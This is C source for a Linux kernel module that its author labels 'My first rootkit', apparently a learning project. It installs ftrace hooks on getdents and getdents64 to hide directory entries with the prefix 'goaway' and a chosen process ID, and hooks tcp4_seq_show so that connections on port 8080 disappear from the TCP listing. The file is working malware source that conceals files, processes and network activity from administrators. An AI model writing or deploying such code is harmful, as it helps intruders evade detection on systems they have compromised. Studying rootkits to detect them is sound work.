#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <linux/version.h>
#include <linux/tcp.h>

#include "ftrace_helper.h"

#define PREFIX "goaway"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Jake Imanaka");
MODULE_DESCRIPTION("My first rootkit");
MODULE_VERSION("0.01");

/* Global variable to store the PID to hide */
char hide_pid[NAME_MAX];

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_getdents)(const struct pt_regs *);

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
   struct sock *sk = v;
   if (sk != 0x1 && sk->sk_num == 0x1f90) return 0;

   return orig_tcp4_seq_show(seq, v);
}


#include "getdents.include"

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
   HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
   HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
   HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
};

static int __init rootkit_init(void){
   /* Hook the syscalls */
   int err;
   err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
   if(err) return err;

   printk(KERN_INFO "rootkit: Loaded >:-\n");

   return 0;
}

static void __exit rootkit_exit(void){
   /* Unhook and restore the syscalls */
   fh_remove_hooks(hooks, ARRAY_SIZE(hooks));

   printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

